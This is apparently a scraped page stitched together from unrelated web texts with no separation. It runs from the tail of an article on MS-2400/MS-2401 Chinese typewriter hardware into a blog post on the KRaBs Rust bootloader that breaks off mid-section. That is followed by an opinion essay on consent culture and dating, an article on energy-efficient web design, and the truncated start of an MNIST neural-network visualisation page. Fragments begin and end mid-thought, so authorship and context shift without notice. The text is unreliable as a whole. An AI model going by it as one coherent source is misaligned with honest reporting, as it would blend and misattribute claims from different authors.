<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT 用)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "控制" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually 半/全 (half width / full width), Tab, Ctrl, Shift, 常用字 (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> plankton🦠  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
├── build.rs
├── Cargo.toml
├── rust-toolchain
├── src
│   ├── bios
│   │   ├── plankton
│   │   ├── stage_1st
│   │   ├── stage_2nd
│   │   ├── stage_3rd
│   │   └── stage_4th
│   ├── main.rs
│   └── uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>

<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>

In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and—yes—was making herself unmarriageable. <em>He won’t buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits … heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis—older, wealthier, more professionally successful, or otherwise more <em>privileged</em>—holds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict—and even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times—and that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by—and the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing—for everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era—nor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity—even when a partner may hold more power than they do by certain measures—and to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak—and even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence—particularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations—but they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes …</p></div></div>

    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” </p>
<p>These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
